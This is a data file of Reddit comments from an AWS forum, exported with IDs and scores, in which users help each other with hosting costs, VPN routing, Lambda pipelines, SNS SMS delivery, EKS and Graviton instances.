g77h3uu,j23s3t,"No, they do all kinds of hosting. Your going to spend way more on AWS hosting actual servers that are going to be charging you by a multiple metrics like CPU uptime, memory, clicks... You've picked most expensive way to do this because you didn't do your own research or follow up on any of the other suggestions here.",1.0
g77jzgo,j23s3t,"&gt; you didn't do your own research or follow up on any of the other suggestions here.

No time.  I need my site up right now.  Another website is going behind a paywall on an unknown date within the week.  I need to have mine available whatever day that is.

Now that I'm actually up and ready to pounce on the opening when it occurs, I can take some time to look at other options.  I currently have the AWS Lightsail, $8/month Windows server tier (512MB memory, 1 core processor, 30GB SSD, and 1TB outbound data).

https://aws.amazon.com/lightsail/pricing/

Assuming I don't go beyond 1TB outbound data transfer, doesn't that mean I'm going to pay $8/month?  Then my domain that I bought off of Google Domains is $1/month.  So we're talking $9/month, right?

I mean, I'm not even selling anything, nor do I have any advertisements.  This is a planned money-losing proposition, as a learning experience on how to do all this stuff.

That being said, I can burn $9/month into perpetuity.  I can't burn $200/month or whatever.",1.0
g72ysp3,j234uf,"You need the workspaces client.

[https://clients.amazonworkspaces.com/](https://clients.amazonworkspaces.com/)

[https://docs.aws.amazon.com/workspaces/latest/userguide/amazon-workspaces-windows-client.html](https://docs.aws.amazon.com/workspaces/latest/userguide/amazon-workspaces-windows-client.html)",2.0
g74klxx,j234uf,OMG it worked. Thanks for the second link. I really appreciate it Matt!,2.0
g788lue,j234uf,My pleasure.,1.0
g73aoca,j2201o,"10.10.10.0/24 is not included in the 10.0.0.0/16 subnet.

10.0.0.0/16 is from 10.0.0.1 to 10.0.255.254.

You should be able to route this just fine.  Send 10.10.10.0/24 out the VPN from AWS and make sure you have a return route of 10.0.0.0/16 on the other side to send the traffic back.",12.0
g73xch2,j2201o,"This is the correct answer, ignore all others below",2.0
g7443d4,j2201o,"Holy crap, I was thinking of a /8 when I was presented with this issue today.  Thanks for keeping my head straight!",2.0
g73zons,j2201o,"this is the answer, you're on the right path, setup the VPN and setup routing on each end to forward packets.  The trickiest part will be configuring your premise router based on the VPN config you can download from AWS.

Finally, don't forget to adjust your security groups in the cloud so that they allow traffic from your [10.10.10.0/24](https://10.10.10.0/24) network to instances you require access to.",1.0
g744h8v,j2201o,"Yep, I've done a lot of VPN deployments with on-premise gear, but apparently I can't binary today...

Thanks!",1.0
g72uyeo,j2201o,So I'm not entirely sure about this but I think you would need some sort of gateway to the network and then edit the route table of the su net in aws to direct the 10.10.10.x range to that gateway? Sorry not super experienced here but trying to help.,-1.0
g734yn4,j2201o,"I think the proposed answer you're thinking of is the NAT solution in the other comment, which will work, just need to research how to implement a 1:1 NAT on this specific gear.",1.0
g72w51v,j2201o,the routes will not work.  if you are stuck with the VPC and on-premise IP assignments then you could set up NAT between the two networks on your on-prem routing device and then reference the external NAT IP addresses.,-2.0
g734ssb,j2201o,"Thanks for the answer and the solution. Yeah NAT may be my best here. I'll need to do some research on how to properly configure our on-premise gear, but this would solve the issue. Thank you!",1.0
g7416h3,j21njr,"Unfortunately not that I am aware of. Understanding the cost of a stack is hard.

Tagging is your best approach to determine which resources are part of your stack. Even that's not perfect due to implicitly created resources, and the fact that tags don't automatically propagate to sub-resources ☹️

Is there a large amount of variability in your stack? If not, the current best approach I know would be to run it in your own environment, and take an indicative cost. Obviously that doesn't help if you've got a lot of change in your application...",2.0
g741g6x,j21njr,You can estimate costs based on the resources you’re creating. If you want real costs though you need access to the CUR and tagged resources.,2.0
g72awv8,j2070k,"possibly because it includes t2. instances, which are not available in eu-north-1",3.0
g73a50w,j2070k,"C4 instances are also missing. 

eu-north-1 also only has 2 AZs.

That, I think was my list of strangeness in eu-north-1, found in the last week.

StackSets are finally there, so that’s nice :-)",1.0
g73d9rv,j2070k,eu-north-1 has 3 az's,2.0
g73md4a,j2070k,"You are right!

I need to apply a change set to Stockholm, then! :-)

Expanding to multi region is probably easier, if the number of AZs is comparable .. I was considering Frankfurt for a bit.",2.0
g73l4qh,j2070k,That might be it. Will test it shortly. I think the default in the script is T2.,1.0
g745k51,j2070k,"u/snipergotya Any reason why specifically a bastion as opposed to Session Manager? [https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html](https://docs.aws.amazon.com/systems-manager/latest/userguide/session-manager.html)

More curious than anything else.",1.0
g75hwbb,j2070k,"To be honest I’ve never used session manager before, have looked at it a few times.

But I’m in the middle of a new project at the minute. I’ve never set it up before, but this project might be perfect for testing it out. Instead of using a bastion host.",1.0
g7k1oto,j2070k,"Just to follow up on this I got up and running with system manager and it has made life so much easier. 
Completely for got about system manager &amp; learning to use session manager has made the whole public/private subnet vpc so much easier to use.

Thanks for the recommendation.",1.0
g7vmvmq,j2070k,You're most welcome. Glad to help out. Good luck with your project. :),1.0
g73blg1,j1ymwz,"I am _super_ excited about the anomaly detection, but am disappointed that you need to put a hard $ amount on the anomaly threshold. My monthly spend on services varies quite a bit (order of 10's of thousands of dollars, for example, and across accounts. I would much prefer to express the thresholds as a percentage. i.e. if spend on ec2 for this account changes by more than 20% in a short period of time, I'm interested.",9.0
g73hk7l,j1ymwz,"Fair point. I think that can be easily added on a future update, if they can do this much...",1.0
g72b2qc,j1ymwz,"This appears to be suited for large environments tracking large amounts of spend. Unfortunately, this still will not stop kids from racking up a multi-thousand dollar bill and crying to AWS about it.

&gt; Additionally, you can subscribe to email or SNS notifications that will alert you based on your pre-defined alert preferences. 

If new users aren't setting up billing alerts today, they're not setting up anomaly alerts tomorrow.",26.0
g72fzal,j1ymwz,Honestly - when you activate an account there should be a prompt that wizards these bits into existence.,16.0
g72wbme,j1ymwz,[deleted],-10.0
g73bt6s,j1ymwz,"Funny, my rep is *constantly* trying to tell me how I can _not_ spend money with them. How I can minimize my bill, how I can take advantage of discounts available to me, etc...",19.0
g74oosc,j1ymwz,"The reps aren’t money grabbing, in my experience.

I will concede that AWS does maximize usage of their services in the myriad reference architectures but no one should be blindly putting any infrastructure into practice. That’s always a bad idea.

AWS is _really_ easy to accidentally spend money in, which is why I advocate researching and reading twice before executing anything, especially templates, reference architectures, and Marketplace solutions. A lot of complaints seem to stem from not understanding what you’re deploying in terms of cost.",2.0
g73xibz,j1ymwz,"Well, if you spend less per project you're more likely to do more projects! So there's that.

EDIT: I'm not sure why the downvotes. This isn't a bad thing. If you can show it makes financial sense then you are more likely to continue using AWS for future tech.",4.0
g73l5cy,j1ymwz,Let’s face it though I doubt the unexperienced people who create an account and rack up an expensive bill really impacts Amazon’s bottom line when in most cases they refund it,2.0
g736zp1,j1ymwz,"Yeah, ""Go set up SNS"" isn't newbie friendly.",4.0
g74wn79,j1ymwz,"to be perfectly honest, AWS isn't really designed for newbies or for hobbyists. It's an enterprise-level cloud and anyone dipping their toes into their ecosystem should have a Solutions Architect - Associate certification at the minimum.

On the other hand, there are companies such as DigitalOcean, Linode, et cetera, which don't impose this upfront knowledge requirement to people using their systems. Or Lightsail.",5.0
g73j7m7,j1ymwz,God damn SNS,2.0
g74qacw,j1ymwz,"This is what i love about reddit. I dont have time to read every aws announcement. Great tl:dr post, thank you",1.0
g757lts,j1ymwz,Woo! I helped build (a small part) of this! Glad to see it helping people out already!,2.0
g736wp0,j1ymwz,"Just set this up yesterday, anyone get an anomaly alert yet?",1.0
g77enue,j1ymwz,Anyone know if the detection is included for free or not?,1.0
g74qfr1,j1ymwz,"On the meta level, does it make sense to trust a provider with anomaly detection on it's own billing? Incentives are somewhat misaligned, though of course no one wants angry customers who feel they have been duped so there's definitely incentive to act ethically.",1.0
g75kdms,j1ze5y,"This is very vague. What is the thing? Is the thing able to upload on its own? Do you need to have a function access the thing via some API and grab the file, then put it into s3? More info please.",1.0
g75n19c,j1ze5y,"Sorry, yes, the thing is able to do uploads itself and the file is stored within the thing (it's a small computer). I guess I could do an IoT Job for the device and it would use Transfer service (mentioned in another comment) to send it to S3.",1.0
g75n6qe,j1ze5y,"Just upload directly to S3, there is no need to use the Transfer service. [https://docs.aws.amazon.com/iot/latest/developerguide/authorizing-direct-aws.html](https://docs.aws.amazon.com/iot/latest/developerguide/authorizing-direct-aws.html) &lt;-- this has instructions on how to assume a role as an IoT thing so you can make calls directly to AWS services from your Thing.",1.0
g75wpc2,j1ze5y,Thanks!,1.0
g757kwi,j1ze5y,How about looking into AWS Transfer Service?  Managed SFTP into your s3 bucket,1.0
g72yxhd,j1z3ch,So Terraform is pretty standard in a lot places for the infra side of things. If your using ECS then Code Deploy is good option but tbh you could also achieve the same with Jenkins.,2.0
g72zqq3,j1z3ch,You could take a look at Copilot - it’s AWS native ECS deployment tool. Relatively new (0.4) but they’re putting out new releases every few weeks with major new features.,2.0
g722nwj,j1yfox,"The client is only available for Ubuntu currently. WorkSpaces leverage a 3rd party protocol currently and the vendor also only offers Ubuntu (Teradici) last I checked. So, it may not be their decision. It's pretty easy to re-package though. I have run it on multiple RPM based systems. You need to unpack it with ar and either repackage with alien or untar it to a folder and run ./opt/workspacesclient/workspacesclient in the unpacked folder.",5.0
g727q7n,j1yfox,Thanks for the suggestion. I will try that.,1.0
g72z8st,j1yfox,"At least there's a package for Archlinux, you can check the repository and fork to make it rpm compatible.",1.0
g734iwv,j1yfox,"Ah indeed there is. Thanks! I did look in the aur but I only searched for ""aws"" which returned the cli client. Searching for ""workspaces"" after your suggestion I found the client.",1.0
g74t1we,j1yfox,The best bet here is the [WorkSpaces web client](https://docs.aws.amazon.com/workspaces/latest/userguide/amazon-workspaces-web-access.html),1.0
g75xf99,j1yfox,"Thanks for the suggestion. Indeed that would be convenient, however, in many occasions,  due to security considerations  web access is not activated.",2.0
g71xfkx,j1xlhs,"Do you have paid support?  If you do, open a ticket. They will point you to documentation and they may be able to arrange a call with someone who can  walk you through it and answer questions.",2.0
g75hohh,j1xlhs,"I think we do, but I need to check this first. In case we don't have one, is it better to renew our subscription(BYOS) or using on-demand subscription from AWS?",1.0
g75mo8f,j1xlhs,"When I say paid support, I mean paid support with AWS.",2.0
g7642z1,j1xlhs,"Yes, we got paid support on AWS. Open a ticket right now. Thank you.",1.0
g71xogk,j1xlhs,I'm not sure about byol or not but my company just migrated SAP to AWS. We used cloudendure to migrate VMs. Cloudendure is super easy to use,2.0
g75hv1n,j1xlhs,"Nice!

We want to give a try with cloudendure, do you migrate both APPS and DB servers using cloudendure? Do you meet any problem during replication and failover?",1.0
g7v58y3,j1xlhs,"Sry for the late reply. CloudEndure can migrate MS SQL and Oracle (along with ""common"" databases) but we are still planning on doing a backup and restore for our shared DB servers since we are migrating different apps at different times",1.0
g71ytz6,j1xhk1,"lambda. 20mb should be fine I think, and you can always write or stream to s3 or EFS. You can literally spin up 5000 concurrent lambdas and chew through that 100k files in a few handfuls of minutes.

Put your XMLs into an s3 bucket, and then manually send messages into an SQS queue to invoke the lambdas. Set a high concurrency limit and go have a coffee.",2.0
g735q3s,j1xhk1,"Thanks for your response. I had a feeling this would be Lambda, good to hear that the scale and speed is so promising!  
We already iscussed putting the XML's in S3 and add a trigger for Lambda to pick up objects as they are put into the bucket. Sounds like that using SQS will give me more async progress?",1.0
g76c4vm,j1xhk1,"Not only that, but imagine you want to run one again. The file added trigger might be too limited here. I'd just dump them all manually there, and then trigger the SQS from your local machine to AWS. Another benefit is having a dead letter queue where you can collect failures and manually fix the issues.",1.0
g76sowr,j1xhk1,"Thanks. This is all very new to me so I have to process this a bit. For example, you mean that each object in S3 would be an entry in the SQS queue, is that correct?. So dumping all files in S3 bucket and then creating an entry per file/object in SQS to trigger processing that file/object. Right? If that is the way it works then I can understand it, the speed of SQS and its nature to have multiple entries process at the same time, resulting in multiple Lambda's being called per SQS item makes a lot of sense.",1.0
g79jxen,j1xhk1,"yep exactly! SQS is just a message queue really. You put messages in, and setup a consumer to pull from the queue. When you setup a lambda as the consumer you can configure the way it works, including max concurrency, rate limits, etc. I would just add those messages to the queue manually using some local script. via aws cli, node js, or python or what ever you're handy with.",1.0
g79s9cc,j1xhk1,"This sounds really good, I like that concept!  
Thanks for all your input, super appreciated",1.0
g7a79z7,j1xhk1,Sure! Good luck!,1.0
g71tj79,j1xhk1,"you want fast or cheap?    pick one.  

https://github.com/AtomGraph/XSLTTransform

you have 512mb to work with before going to EFS.",1.0
g7364fa,j1xhk1,"Thanks for the response!  
I have a feeling that I need to look at this more closely as I did not quite get what this github package will bring but I assume it is awesome. Would this be the 'fast' or the 'cheap' one?",1.0
g73gbq4,j1xhk1,fast if you toss up thousands of lambda's at once.    this could be done in seconds to minutes.,1.0
g71vokb,j1xhk1,"Do you need them all, now? If not, Lambda might be a decent solution as part of an ""on demand"" pipeline:

1. User clicks on a ""Send me the PDF"" link and provides their email address.
2. If PDF does not exist, call Lambda function to create it. Store the resulting PDF in an S3 bucket.
3. Send PDF from S3 bucket to user.

Test Lambda against your largest/most complex XML file(s). If it's timing out, change the amount of memory allocated.",1.0
g735xnx,j1xhk1,"Thanks for replying!  
We do not need them now, this is process where the team is waiting to have the files completed and then move these to another storage and add meta data in an RDS about the files. And testing against the largest set is a good idea, we discussed this as well internally :-)",1.0
g71zmss,j1xhk1,"You will want to use something like XSL:FO with Apache FOP, or iText.

Scaling at a desired price point depends on how quickly you’d want this done. The first million Lambda requests are free, so that might help with costs (checkout AWS free tier).",1.0
g735ebq,j1xhk1,"Thanks, we will look Apache FOP, we came across that one when I did a quick search. Lambda seems to be the way to go if I read the messages right when I need/want to deploy this in AWS?",1.0
g73wklg,j1xhk1,"Lambda is the way to go if you a) don't want to manage scaling yourself and b) you don't want to manually spin up or down the service when its not in use. With Lambdas, you don't get charged when its not in use.

I also want to second someone's suggestion of using an S3 bucket. It would go roughly something like this:

1. Create the S3 bucket(s).
    - You can create one bucket and two ""subfolders"" (e.g. `xml/`, `pdfs/`).
    - Or you can create two buckets, one for XML and one for PDF.
2. Create the Lambda.
3. Create [a Lambda trigger for the S3 bucket's PUT events](https://docs.aws.amazon.com/lambda/latest/dg/with-s3.html).
    - If using one bucket, make sure you filter events by the subfolder the XML files are in. You don't want to accidentally invoke the Lambda for each PDF created by the Lambda when it is uploaded to the same bucket.
4. Upload all of your XML to the bucket.

Then it would just be a matter of waiting for the Lambda to finish processing all of the events. There are some things you need to consider:

- Creating and attaching a dead letter queue to your Lambda. This is to catch instances of the Lambda failing to process an XML file.
- Creating a CloudWatch alert to be notified when the Lambda fails to process one or more XML files.",1.0
g71u5f5,j1wyzx,"Country codes! 

We had the same symptoms... but added the +44 to the intended recipient (we're UK) and it started working.

Previous messages were delivered but to some random country.",6.0
g71xund,j1wyzx,Quota exceeded? We have seen SMS drop silently in this situation. The default SMS quota is quite low. You may need to ask for an increase.,1.0
g7236oa,j1wyzx,Did you raise ticket with AWS? just wondering if region of your infrastructure vs country of sms are they same. But in all cases you should get some cloud watch logs.,1.0
g72gvn3,j1wyzx,"Yes they are on the same region, it worked previously. Cloud watch log says SUCCESS. To raise ticket I need to pay $29 correct? Or there's free option?",1.0
g736ps8,j1wyzx,I suggest try here - [https://forums.aws.amazon.com/index.jspa](https://forums.aws.amazon.com/index.jspa) for free inputs. I can see that it costs $29 or 3% of your monthly usage. But I guess it might be worth if your notification is adding value. Also try stackoverflow.,1.0
g73rcun,j1wyzx,"**short answer:** 

SNS SMS is unreliable

**long answer:** 

When an SMS message is published to AWS SNS, the message is forwarded to downstream Providers. The downstream Providers, in turn, forward the message to mobile phone carriers. 

The mobile phone carriers are responsible for the last leg of message delivery to phone numbers.   

That is, the flow for SMS messages is as follows:

Amazon SNS -&gt; downstream Providers -&gt; Mobile Phone carriers -&gt; Mobile Endpoint  

Sometimes issues in downstream Providers and carriers can be the reason for the failures or delays in SMS notifications. **As the complete architecture is not under AWS control,** the customer need to let AWS know about issues so AWS can escalate it with the downstream carriers and work with them till the issue is fixed.

With that said, there are also a couple of other reason why SMS delivery can fail, few of them are:  

\* Blocked as spam by phone carrier   
\* Destination is blacklisted   
\* Invalid phone number   
\* Message body is invalid   
\* Phone carrier has blocked this message   
\* Phone carrier is currently unreachable/unavailable   
\* Phone has blocked SMS   
\* Phone is blacklisted   
\* Phone is currently unreachable/unavailable   
\* Phone number is opted out   
\* This delivery would exceed max price   
\* Unknown error attempting to reach phone",1.0
g723jb9,j1t8a4,Is there any modern reason to not use at least a HTTP 1.1 client?  The HTTP 1.1 standard was released January 1997.,1.0
g7qlp97,j1t8a4,"I have tested this compression feature for just understanding. so I don't have considering to modern environments on clients. 

thanks :)",1.0
g71pcaq,j1qvdk,in EKS you never see the master nodes since AWS manages them,2.0
g71ru9a,j1qvdk,"@hijinks in gke, you can set configurations for master node when initializing.

will eks master scale up as worker nodes increase? There isn’t much documentation on master nodes",1.0
g71tt3a,j1qvdk,"What sorts of configurations, actions, or tasks have you been managing with access to the control plane?

Regarding scaling, [the EKS product page](https://aws.amazon.com/eks/features/) says:

&gt; Amazon EKS automatically manages the availability and scalability of the Kubernetes control plane nodes that are responsible for starting and stopping containers, scheduling containers on virtual machines, storing cluster data, and other tasks.",1.0
g72223w,j1qvdk,just curious about how eks scales master nodes,1.0
g71u0ly,j1qvdk,Yes. I haven't noticed any issues with scaling. We go from 8 workers overnight to over 400 during the day,1.0
g721yeh,j1qvdk,"&gt;Yes. I haven't noticed any issues with scaling. We go from 8 workers overnight to over 400 during the day

it seems one master node one az

[https://youtu.be/7vxDWDD2YnM?t=277](https://youtu.be/7vxDWDD2YnM?t=277)",1.0
g71sr70,j1qvdk,"Having the control plane components on master nodes is just one possible setup for Kubernetes, albeit the most common one on self-managed clusters. Managed Kubernetes services like EKS run them somewhere in their ""cloud"" and you just add the worker nodes for your workloads.",1.0
g71oquu,j1p4nh,"There's no need to hardcode credentials, use ENVs locally and ENVs/EC2 metadata store when deployed to AWS, the AWS SDK will look for those automatically.",1.0
g78gk1e,j1p4nh,"yes, I was using .env for store the credentials",1.0
g71r6qr,j1w6aw,You have a few options. My favorite is to subscribe to the device shadow for real time updates. Get permissions from a request and use the app to subscribe to your thing. The other suggestion is to use app sync’s subscriptions. Your rule will need to use app sync to update the table. when it does anything subscribing to that model will receive the change.,2.0
g71nktq,j1w6aw,Fleet indexing would help only at certain extent.. in Dynamodb.. streams would help you do lot more..,1.0
g730386,j1w6aw,"2-minute video that demonstrates this

https://www.youtube.com/watch?v=tQkiF3AeKfs",1.0
g72hqi8,j1ul2g,https://docs.aws.amazon.com/transcribe/latest/dg/how-streaming-transcription.html,1.0
g71ede3,j1uckc,You can assume a role into another account with the DynamoDB table,4.0
g71fim0,j1uckc,Thanks! I just found some good info on that online.,1.0
g71pb0n,j1uckc,Share if u can,2.0
g72qdsf,j1uckc,"https://docs.aws.amazon.com/glue/latest/dg/aws-glue-programming-etl-dynamo-db-cross-account.html

https://stackoverflow.com/questions/55826208/aws-cross-account-dynamodb-access-with-iam-role",1.0
g72vtub,j1uckc,"Using assume role from one account in another is your best option, that said you should review how your applications works - generally it feels like a code smell to have more than one application reading/writing to a database (even dynamo).  Instead it may be best to provide an API for those operations that the other accounts can call.

A single responsible application for database writes/reads will make things much more maintainable in the long run and easier to track down who/what made a change.",1.0
g736dvo,j1uckc,"Oh I agree. This isn't my doing. Our dev and DB guy are being dumb here. Unfortunately, we're not going to expend too much effort on this issue beyond this &gt;_&gt;",1.0
g71eo76,j1u9rg,"Amazon came out with the service quotas portal, I believe they exposed it all via an api too.  So you could write a lambda when they get close to the limit.",5.0
g72pvn7,j1u9rg,"Why did you submit this exact same post to the Azure and GCP subreddits?

https://www.reddit.com/r/googlecloud/comments/j1u76p/automated_help_on_quota_increases/

https://www.reddit.com/r/AZURE/comments/j1ua8c/automated_help_on_quota_increases/",3.0
g7287sv,j1u9rg,"This is a business, not a technical limitation. If AWS grants you access to create all of their GPU instances in all regions all at once, and you can't pay for it, then you've edged out all of the money they would have made from others paying for e.g. spot instances.

The quota system lets them capacity-plan and build out by knowing where they are between 0% and 100% usage based on their maximum possible use.

If your money is green enough, they will give you increases based on what you think you will reasonably use, right? But ""maximum"" quota doesn't and can't exist without evidence that you're going to be able to pay for that quota if it's used.

That said, most services have quotas exposed now, and you can know where your counts are vs. the quotas. Some services may still not have that in place yet, but there seems to be quarterly or annual goals to get more services exposed there.",2.0
g717rpi,j1sr0r,"You haven't explained what your use case is, but I'm fairly sure S3 isn't the correct service for you to be using.

Amazon S3 is object storage; in other words, you basically have a key that corresponds to a blob of data stored in the S3 service. It's somewhat like a database but for blob files.

Since you're migrating from a SQL server, I don't believe S3 will handle what you need unless you plan on using Amazon Athene to query structured objects in place (i.e., CSV or Apache Parquet files, or even JSON files).

If you're migrating from on premises to AWS and you want to keep using a relational database, consider using Amazon Relational Database Service (aka Amazon RDS); you can run MySQL, PostgreSQL, and (among a few other things) Amazon Aurora, a proprietary database engine that can be MySQL or PostgreSQL compatible. 

If you want to move to a serverless database ***and*** your application can handle only being able to query primary keys, you may want to consider using Amazon DynamoDB, a serverless NoSQL database.

----

If you really do want to move to S3 (and then potentially query with Athena), you'll want to export in a structured or semi-structured data format, whichever you can export in. If you're going to query with Athena, you'll want to export in Apache Parquet or Apache ORC, whichever is supported by your current engine. If you want the data to be human readable without querying (i.e., download the file and view it on your computer), you can export in JSON or CSV. If you don't care about human readability, use any of the four formats I mentioned already.

Regardless, once you've exported the data you want to move, take the files you downloaded and upload them to S3 using either the CLI, SDKs, or management console. You've now migrated to S3. I don't have experience with using Athena, so look at [Athena's Documetation](https://docs.aws.amazon.com/athena/latest/ug/what-is.html) for how to get started.",1.0
g71983j,j1sr0r,"Do a bcp out with native format for a faster export of the data to a local storage and then use the aws cli to upload it, you can also play around with batchsize settings of bcp to export faster. 

If you need more performance there are a few things to consider... 

If you are able to run a few tests for benchmarking I would give a try to compress the bcp files before uploading them since you might have some significant savings but depending on how are you going to access the data later in the s3 it might not be worth it. 

To improve the upload performance to the s3 you could try with this tool:
https://github.com/larrabee/s3sync",1.0
g71reyo,j1sr0r,"Not that familiar with SQL Server, but can you dump out specific tables?  If so, I'd do that and then copy these dump files up to S3.",1.0
g75jq53,j1sr0r,"Yes, if OP only doing this one time, I think dump the tables as csv and upload to S3 is the most efficient way.",1.0
g71swqo,j1sr0r,"If as u/tycoonlover1359 mentioned, you want to export data to a Data Lake in S3, check out this blog post on [how to access and analyze on premise data stored using AWS Glue](https://aws.amazon.com/blogs/big-data/how-to-access-and-analyze-on-premises-data-stores-using-aws-glue/). It specifically mentions on premise SQL Server.

For simple use cases without much schema transformation, AWS Glue can crawl your origin tables and automatically generated the code to load the data into S3. For more advanced use cases you can modify the Spark code as needed.

It is a serverless service, so you only pay while it's moving your data.

How frequently do the original tables change? How big are they? Do the changes update existing rows, or are all changes inserts?

These are important factors if you need to continuously update the data in S3. For example, if you only insert into the origin tables, then AWS Glue can copy only the new rows, but if you modify existing rows, then you may need a full copy each time.",1.0
g716vd3,j1rtze,"Oh, did you create a SFTP Endpoint with the AWS Transfer Family?

Since you have an EC2 instance and thus SSH access, SFTP is file transfer over SSH. You should be able to directly SFTP onto the EC2 instance without further costs.",8.0
g72c4tl,j1rtze,"Thank you! I'm not sure why I enabled the endpoint in the AWS Transfer Family, but after deleting that service I am still able to sftp into my EC2 instance.",1.0
g71b4mk,j1rtze,"Anything in AWS costs money! Start an instance : money. Give it a bigger disk : money. Use a different service :money.

However, like the other post says, if you can ssh to your instance you can sftp or scp to your instance (for free!). When connecting with ssh you get an interactive session. The same command but replace ssh with scp and a local file and add a colon to the end of the IP address and it will copy the file to your user's home directory. Add :/tmp and it will copy to /tmp. Don't specify the local file but add :remotefile and a space and . And it will copy remotefile to your current directory.

Add :/remotefile /tmp and it will copy /remotefile to /tmp.

Eg ssh -i key.pem ec2-user@123.45.6.7

Becomes scp -i key.pem world.file ec2-user@123.45.6.7:

I can't recall otoh whether you need -r for recursing into directories, but I'm pretty sure you can copy directories easily too.

Obviously if you copy to :/application ec2-user needs permission to write there. If he has no permission then copy the file into home dir. Then login with normal ssh and sudo the copy. Or before copying : add the user to the correct permission group or adjust the permissions on /application or set up ACLs (hard!)",1.0
g72gifl,j1rtze,Thank you for your advice!,1.0
g7268e6,j1rtze,"Do not use AWS transfer family. This is for a different use case. 

Since you already know rclone and you have an ec2 instance, you should be able to follow the instructions here: https://rclone.org/sftp/

Just use you ec2 host as the remote. You'll need to be able to ssh to the ec2 host for this to work, but I assume you have that is you are installing software there already.",1.0
g71lpna,j1raxw,"https://dev.to/duarten/passwordless-authentication-with-cognito-13c


As a side note, do your research before opting for cognito. It has many useful features but also many significant pain points. Make sure you know what you’re in for.",3.0
g710cyu,j1raxw,Interested in this as well. At the moment we're generating a temp. password and then invalidating it as soon as they use it to log in,1.0
g71uedj,j1p9ul,This is an interesting question. i think it depends on what’s being processed and the desired end state.,1.0
g71vf7x,j1p9ul,"I’m not sure why those two questions really change the design solution for the question, but...I’m processing text based data using a combination of step functions, lambda’s and Fargate containers.  End state is to push the raw + enrichment data into elasticsearch.",1.0
g71xu8j,j1p9ul,can’t use global tables. don’t need to replicate iot core things across region. tons of use cases for the event bus.,1.0
g70o9uw,j1i7iz,"If you’re using almost any modern language - JS, Node, Java, C# etc. It won’t matter.  Any underlying native dependencies are probably already available when you retrieve them via their respective package managers.",5.0
g70l8sb,j1i7iz,"I read somewhere that it's more energy efficient, so maybe save the planet by using ARM? Ok, that's a stretch...",3.0
g73bj2s,j1i7iz,"It is - while the specs on the Graviton aren't public, I'd guess they use 1/3 the energy of Intel/AMD CPUs. I'd also guess that's the main factor as to why they are cheaper.",1.0
g70n337,j1i7iz,"When you need to build ARM compatible binary code, fast.",3.0
g70q6u7,j1i7iz,I doubt a binary compiled on *Graviton2* would run e.g. on *RaspberryPi*.,-1.0
g70te61,j1i7iz,"In fact this is how it works. They are both ARM, just graviton is much faster. Just like you can compile x86 binaries on x86_64",7.0
g70vs51,j1i7iz,"I build armv6l, armv7 and aarch64 on the same Graviton hardware. Works well and works fast.",3.0
g72hdyf,j1i7iz,"If you are using different Linux distributions between them or overly specific compiler flags, you can run into issues.  But it literally is possible to just move ARM Linux binaries between Ras Pi and Graviton 2.  Biggest difference right now is probably that the Raspberry Pi ecosystem is still mainly 32 bit.",1.0
g72plyv,j1i7iz,"The same is true if you optimize for the most recent Intel instruction set extensions. Compilers and Linux generally have support for creating binaries and libraries that are compatible with a broad range of processor implementations, and can select an optimized implementation at runtime.

For example, Graviton2 processors implement the Arm v8.2-A Large System Extensions (LSE) which improve locking and synchronization performance across a large number of processor cores. If you want to create a binary that also runs on processors that implement Arm v8.0-A (see [https://en.wikipedia.org/wiki/Comparison\_of\_ARMv8-A\_cores](https://en.wikipedia.org/wiki/Comparison_of_ARMv8-A_cores)), you can use the `-moutline-atomics` option in GCC 10 or later (or another version of GCC with backported support) to create a backwards compatible binary. (see [https://github.com/aws/aws-graviton-getting-started/blob/master/optimizing.md#locksynchronization-intensive-workload](https://github.com/aws/aws-graviton-getting-started/blob/master/optimizing.md#locksynchronization-intensive-workload))

I see a lot more AArch64/Arm64 activity coming from the Raspberry Pi community now that Raspberry Pi 4 is out. And the compiler defaults will generally create binaries that are compatible between a processor like the BCM2711 in the Pi 4, AWS Graviton, and AWS Graviton2.",6.0
g723wmj,j1i7iz,"It _looks_ like for some of my workloads we’re going to get better performance per instance out of c6g than c5 (still doing a lot of testing). That’ll mean we can support the same workload with fewer instances. **technically** thats a “cost reason to do it”, but then technically the reason to do anything is a cost reason.",2.0
g72fz0z,j1i7iz,"better performance per machine because not hyperthreaded (real cores); thus run fewer machines, less machine dependent load e.g. # of db connections, caches to keep refreshed.

also easier on the earth because better performance per watt.

and in theory the compression offload chip should be available soon...",2.0
g7388wl,j1i7iz,"I use Graviton in the morning, evening, and at night. Before breakfast, and after dinner. There is never a time when it isn’t right there serving my compute needs.",2.0
g70vpnf,j1i7iz,"When? When you need more than a small t3 continually, run Linux, and use a high level languages already compiled to ARM. In that case you'll barely notice any difference other than better cost. 

If you are more technical you can compile anything missing from source, and run your apps written in C++ for example.",1.0
g70ze9q,j1i7iz,"&gt;you'll barely notice any difference other than better cost

So it *is* mostly about cost, right?",2.0
g72q2bh,j1i7iz,"Most everything is, really.  You use computers because it costs less than doing it by hand.  You use AWS because it costs less than running your own DC.  You use EC2 because it costs less than a value added managed service.  You use a certain EC2 type because it costs less than another type.  It's dollars all the way down.",4.0
g73y2pl,j1i7iz,"Well yes and no. Sometimes you choose a technology because it's the best fit for the purpose for some technical reasons. 

For example: you'd use GPUs for *machine learning* because they can be order of magnitude faster *for this particular workload* than CPUs. Indeed it's about cost in the end, ML training on a GPU is way cheaper than on a cluster of CPUs, but the cost effectiveness comes from the fact that GPUs are far better suited for this workload than CPUs.

So I wonder if there's something that ARM can do (more efficiently) that Intel can't. In a similar way that GPU can do things that CPU can't. 

But reading the responses here it looks like it's ""just"" a very efficient general purpose CPU. Which is good enough of course :)",1.0
g74idxg,j1i7iz,"There are architectural and microarchitectural differences between x64 and AArch64 that can lead to meaningful differences in processing capabilities. As general purpose processors, orders of magnitude differences are rare. However, there are some 1.5x to 2x type differences for specific algorithms, especially when you take advantage of the native instructions and available extensions (like int8/fp16 for ML inference, and SHA-2, SHA-256, CRC, AES, GCM, etc.) Some of those may make implementing certain workloads practical on Graviton2 powered instances, but impractical on other EC2 instances.",3.0
g70zvyt,j1i7iz,I think that's fair to say.,1.0
g71woad,j1i7iz,t4g exists now,2.0
g73i8ug,j1i7iz,"I should clarify more than t3 intel/amd. Their graviton numbers are a generation ahead, since not same CPU its not really a good comparison. I by no means want to imply t4 graviton is ahead of t3 for all workloads.",1.0
g70kabq,j1jk7u,If you want to run it yourself hard to beat this: https://github.com/widdix/aws-s3-virusscan,5.0
g70yb8h,j1jk7u,Interesting. Thanks for the pointer.,1.0
g8823v9,j1jk7u,"Agree that the free version of Widdix is a good solution to try out.

